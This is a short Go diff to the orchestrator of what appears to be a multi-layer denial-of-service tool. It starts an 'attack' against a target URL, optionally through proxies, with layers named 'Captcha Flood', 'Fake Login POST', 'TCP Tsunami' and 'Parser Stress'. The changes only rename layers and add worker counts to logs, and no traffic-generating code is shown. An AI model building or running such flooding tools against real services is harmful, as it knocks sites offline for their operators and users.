@@ -6,10 +6,10 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"log"
-	"fmt"
 	"net/url"
 	"sync"
 	"time"
+	"fmt"
 )
 
 type Orchestrator struct {
@@ -87,8 +87,8 @@ func (o *Orchestrator) Start() {
 	o.stats.StartTime = time.Now()
 	o.mu.Unlock()
 
-	log.Printf("[orch] Attack %s starting against %s (proxy: %v)", o.id, o.target.String(), o.useProxy)
-	o.hub.BroadcastLog("success", fmt.Sprintf("Attack started: %s (Proxy: %v)", o.id, o.useProxy))
+	log.Printf("[orch] Attack %s starting against %s (proxy: %v, workers: %d)", o.id, o.target.String(), o.useProxy, o.layers.Total())
+	o.hub.BroadcastLog("success", fmt.Sprintf("Attack started: %s (Proxy: %v, Workers: %d)", o.id, o.useProxy, o.layers.Total()))
 	o.hub.BroadcastLog("info", "Target: "+o.target.String())
 
 	o.wg.Add(1)
@@ -99,14 +99,15 @@ func (o *Orchestrator) Start() {
 		timer = time.After(o.duration)
 	}
 
+	// Launch all 5 layers
 	o.wg.Add(1)
 	go o.launchLayer("L1 - Chunked Abuse", o.layers.L1, layer1Chunked, timer)
 	o.wg.Add(1)
-	go o.launchLayer("L2 - Recursive Params", o.layers.L2, layer2Recursive, timer)
+	go o.launchLayer("L2 - Captcha Flood", o.layers.L2, layer2Recursive, timer)
 	o.wg.Add(1)
-	go o.launchLayer("L3 - Cache Bypass", o.layers.L3, layer3CacheBypass, timer)
+	go o.launchLayer("L3 - Fake Login POST", o.layers.L3, layer3CacheBypass, timer)
 	o.wg.Add(1)
-	go o.launchLayer("L4 - Connection Pool", o.layers.L4, layer4PoolExhaust, timer)
+	go o.launchLayer("L4 - TCP Tsunami", o.layers.L4, layer4PoolExhaust, timer)
 	o.wg.Add(1)
 	go o.launchLayer("L5 - Parser Stress", o.layers.L5, layer5ParserStress, timer)
 
